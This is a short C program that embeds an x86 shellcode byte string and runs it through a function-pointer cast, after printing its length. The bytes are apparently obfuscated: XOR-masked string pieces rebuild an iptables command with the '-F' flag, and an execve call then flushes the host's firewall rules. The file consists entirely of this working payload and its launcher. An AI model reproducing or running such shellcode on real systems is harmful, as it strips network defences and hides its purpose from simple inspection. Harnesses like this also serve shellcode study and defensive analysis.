#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x54\x5b\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80";

main()
{
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
